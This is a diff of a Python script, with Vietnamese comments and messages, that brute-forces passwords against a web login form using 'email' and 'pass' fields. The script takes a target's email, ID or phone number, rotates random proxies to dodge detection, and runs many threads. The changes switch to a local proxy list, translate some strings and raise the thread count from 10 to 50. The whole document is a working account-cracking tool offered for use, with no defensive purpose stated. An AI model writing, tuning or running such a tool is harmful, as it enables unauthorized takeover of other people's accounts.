@@ -19,24 +19,18 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
 }
 
-# Hàm lấy danh sách proxy từ ProxyScrape
-def get_proxies():
+# Lấy danh sách proxy từ tệp proxy.txt
+def get_proxies_from_file():
     try:
-        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
-        if response.status_code == 200:
-            proxies = response.text.splitlines()
+        with open('proxy.txt', 'r') as file:
+            proxies = file.read().splitlines()
             return proxies
-        else:
-            print("Không thể lấy danh sách proxy")
-            return []
-    except requests.RequestException as e:
-        print(f"Lỗi khi lấy proxy: {str(e)}")
+    except IOError as e:
+        print(f"Error reading proxies file: {str(e)}")
         return []
 
 # Hàm thực hiện đăng nhập
 def login(target, password, proxies):
-    if not proxies:
-        return -1  # Không có proxy để thử
     proxy = random.choice(proxies)
     proxies_dict = {
         'http': f'http://{proxy}',
@@ -45,7 +39,7 @@ def login(target, password, proxies):
     data = {
         'email': target,
         'pass': password,
-        'login': 'Đăng nhập'
+        'login': 'Log In'
     }
     
     try:
@@ -74,25 +68,25 @@ def worker(target, proxies):
         password = password_queue.get()
         if password is None:
             break
-        print(f"Đang thử mật khẩu: {password}")
+        print(f"Trying password: {password}")
         result = login(target, password, proxies)
         if result == 1:
             result_queue.put(f"[+] Thành công! Mật khẩu: {password}")
             break
         elif result == 2:
-            result_queue.put(f"[!] Tài khoản yêu cầu xác minh 2 lớp. Mật khẩu đã thử: {password}")
+            result_queue.put(f"[!] Tài khoản bị khóa với xác minh 2 yếu tố. Mật khẩu đã thử: {password}")
             break
         password_queue.task_done()
 
 # Hàm chính để khởi chạy các luồng
-def Main(target):
-    proxies = get_proxies()  # Lấy danh sách proxy từ ProxyScrape
+def main(target):
+    proxies = get_proxies_from_file()  # Lấy danh sách proxy từ tệp
 
     if not proxies:
-        print("Không có proxy nào, thoát.")
+        print("Không có proxy, thoát chương trình.")
         return
 
-    num_threads = 10  # Số luồng để thử nghiệm
+    num_threads = 50  # Số luồng để thử nghiệm
 
     # Tạo luồng thử mật khẩu
     threads = []
@@ -121,5 +115,5 @@ def Main(target):
         password_queue.put(None)
 
 if __name__ == "__main__":
-    target = input("Nhập email, ID hoặc số điện thoại của mục tiêu: ")
-    Main(target)
+    target = input("Nhập email, ID, hoặc số điện thoại của mục tiêu: ")
+    main(target)
